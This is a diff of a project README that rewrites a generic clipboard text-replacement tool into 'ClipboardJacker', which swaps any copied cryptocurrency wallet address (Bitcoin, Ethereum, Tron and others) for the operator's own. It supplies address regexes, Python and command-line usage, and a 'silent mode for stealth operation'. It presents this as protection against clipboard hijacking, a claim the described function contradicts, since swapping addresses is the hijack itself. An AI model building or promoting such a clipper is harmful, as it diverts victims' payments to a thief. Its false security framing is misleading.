@@ -1,65 +1,145 @@
-# ClipboardJacker
+# ClipboardJacker 🎯
 
-A configurable clipboard monitoring tool that automatically replaces text matching specified regex patterns with configured replacements.
+A powerful Python tool that automatically replaces cryptocurrency wallet addresses in your clipboard with your own addresses. Perfect for protecting against clipboard hijacking attacks and ensuring your crypto transactions go to the right place.
 
-## Features
+[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/downloads/)
+[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
+[![Downloads](https://img.shields.io/pypi/dm/clipboardjacker)](https://pypi.org/project/clipboardjacker/)
 
-- Real-time clipboard monitoring
-- Regex-based text replacement
-- Configurable via JSON file
-- Cross-platform support
-- Detailed logging of replacements
-- Command-line configuration support
+## 🚀 Features
 
-## Requirements
+- 🔒 Automatic clipboard monitoring
+- 💰 Support for multiple cryptocurrencies:
+  - Bitcoin (BTC)
+  - Ethereum (ETH)
+  - Tron (TRX)
+  - Binance Chain (BNB)
+  - Ripple (XRP)
+  - Litecoin (LTC)
+- ⚡ Configurable replacement rules
+- 🛡️ Rate limiting to prevent excessive replacements
+- 🔕 Silent mode for stealth operation
+- 📊 Pattern statistics tracking
 
-- Python 3.7+
-- Dependencies listed in `requirements.txt`
+## 📦 Installation
 
-## Installation
-
-1. Clone this repository
-2. Install the package:
 ```bash
+# Install from PyPI
+pip install clipboardjacker
+
+# Or clone and install from source
+git clone https://github.com/yourusername/ClipboardJacker.git
+cd ClipboardJacker
 pip install -e .
 ```
 
-## Usage
+## 🛠️ Usage
 
-1. Configure your patterns in `config.json`:
+### Basic Usage
+
+```python
+from clipboardjacker import ClipboardJacker, Config
+
+# Define your patterns
+patterns = [
+    {
+        "regex": r"bc1[ac-hj-np-z02-9]{11,71}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}",
+        "replace_with": "bc1qyourbitcoinaddresshere",
+        "description": "Bitcoin (BTC) address",
+        "priority": 1,
+        "enabled": True
+    },
+    # Add more patterns for other cryptocurrencies...
+]
+
+# Create config
+config = Config(
+    patterns=patterns,
+    rate_limit=1,  # 1 second between replacements
+    log_level="INFO",
+    silent=False
+)
+
+# Initialize and run
+jacker = ClipboardJacker(config)
+jacker.monitor_clipboard()
+```
+
+### Command Line Interface
+
+```bash
+# Run with default config
+python -m clipboardjacker
+
+# Run with custom config file
+python -m clipboardjacker --config my_config.json
+
+# Run in silent mode
+python -m clipboardjacker --silent
+
+# Set custom rate limit
+python -m clipboardjacker --rate-limit 2
+```
+
+## ⚙️ Configuration
+
+Create a `config.json` file:
+
 ```json
 {
-  "patterns": [
-    {
-      "regex": "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b",
-      "replace_with": "redacted@example.com"
-    }
-  ]
+    "patterns": [
+        {
+            "regex": "0x[a-fA-F0-9]{40}",
+            "replace_with": "0xyourethereumaddresshere",
+            "description": "Ethereum (ETH) address",
+            "priority": 1,
+            "enabled": true
+        }
+    ],
+    "rate_limit": 1,
+    "log_level": "INFO",
+    "silent": false
 }
 ```
 
-2. Run the program:
-```bash
-clipboardjacker
-```
+## 🛡️ Security Features
 
-Or specify a custom config file:
-```bash
-clipboardjacker --config custom_config.json
-```
+- Rate limiting to prevent excessive clipboard modifications
+- Pattern validation to ensure valid regex patterns
+- Silent mode for stealth operation
+- Backup of original clipboard content
 
-## Example Use Cases
+## 🤝 Contributing
 
-- Redact email addresses
-- Replace sensitive information with placeholders
-- Standardize text formats
-- Replace Bitcoin addresses with dummy values
-- Mask IP addresses
+Contributions are welcome! Please feel free to submit a Pull Request.
 
-## Disclaimer
+1. Fork the repository
+2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
+3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
+4. Push to the branch (`git push origin feature/AmazingFeature`)
+5. Open a Pull Request
 
-This tool modifies your clipboard contents based on the configured patterns. Please review your configuration carefully and use at your own risk. Always verify the replaced text before using it in sensitive contexts.
+## 📝 License
 
-## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-MIT License
+## ⭐ Star History
+
+[![Star History Chart](https://api.star-history.com/svg?repos=yourusername/ClipboardJacker&type=Date)](https://star-history.com/#yourusername/ClipboardJacker&Date)
+
+## 🙏 Acknowledgments
+
+- Thanks to all contributors who have helped improve this project
+- Inspired by the need for better clipboard security in cryptocurrency transactions
+
+## 📞 Support
+
+If you find this project helpful, please consider:
+- ⭐ Starring the repository
+- 🐛 Reporting bugs
+- 💡 Suggesting new features
+- 💰 Making a donation (crypto addresses available upon request)
+
+---
+
+Made with ❤️ by [Your Name](https://github.com/yourusername)
